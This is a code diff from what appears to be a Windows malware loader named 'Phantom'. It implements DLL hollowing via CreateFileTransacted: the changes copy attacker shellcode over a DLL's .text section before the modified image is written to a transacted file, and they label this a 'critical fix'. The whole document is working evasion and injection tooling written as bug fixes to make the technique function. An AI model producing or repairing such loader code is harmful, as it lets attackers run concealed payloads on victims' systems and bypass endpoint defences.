@@ -111,12 +111,6 @@ BOOL _Phantom_CreateTransactionalFile(PPHANTOM_CONTEXT pContext) {
         return FALSE;
     }
 
-    // Modify DLL with shellcode
-    if (!_Phantom_HollowDLL(pContext)) {
-        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
-        return FALSE;
-    }
-
     // Create transactional file using CreateFileTransacted
     typedef HANDLE (WINAPI *fnCreateFileTransactedW)(
         LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID
@@ -145,6 +139,16 @@ BOOL _Phantom_CreateTransactionalFile(PPHANTOM_CONTEXT pContext) {
     );
 
     if (pContext->hFile == INVALID_HANDLE_VALUE) {
+        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
+        return FALSE;
+    }
+
+    // CRITICAL FIX: Modify DLL BEFORE writing to file
+    if (!Phantom_ModifyDLL(pDLLBuffer, dwFileSize,
+                          pContext->config.pShellcode,
+                          pContext->config.szShellcodeSize)) {
+        CloseHandle(pContext->hFile);
+        pContext->hFile = INVALID_HANDLE_VALUE;
         HeapFree(GetProcessHeap(), 0, pDLLBuffer);
         return FALSE;
     }
@@ -332,16 +336,9 @@ BOOL Phantom_ModifyDLL(PVOID pDLLBase, SIZE_T szDLLSize, PVOID pShellcode, SIZE_
         return FALSE;
     }
 
-    // Replace .text section with shellcode
-    DWORD dwOldProtect;
-    if (!VirtualProtect(pTextAddr, szTextSize, PAGE_READWRITE, &dwOldProtect)) {
-        return FALSE;
-    }
-
+    // CRITICAL FIX: DLL is in heap memory, just write directly (no VirtualProtect needed)
+    // The buffer will be written to transactional file, not executed from this location
     memcpy(pTextAddr, pShellcode, szShellcodeSize);
-
-    // Restore protection (should be RX for code)
-    VirtualProtect(pTextAddr, szTextSize, PAGE_EXECUTE_READ, &dwOldProtect);
 
     return TRUE;
 }
